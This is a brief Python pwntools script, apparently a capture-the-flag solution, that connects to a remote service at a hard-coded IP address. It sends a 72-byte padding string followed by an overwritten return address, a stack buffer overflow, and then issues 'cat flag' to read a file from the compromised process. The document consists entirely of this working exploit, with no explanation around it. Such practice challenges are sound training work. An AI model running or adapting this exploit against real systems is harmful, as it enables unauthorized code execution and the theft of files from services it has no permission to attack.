from pwn import *

pwnlib.context.context.clear(arch='amd64', os='linux')

r = remote("34.123.15.202", 5000)

payload = bytearray()
payload += ('a' * 72).encode('ascii')
payload += b'\x36\x11\x40\x00\x00\x00\x00\x00'
r.sendline(payload)
r.sendline(b'cat flag\n')
print(r.recv())
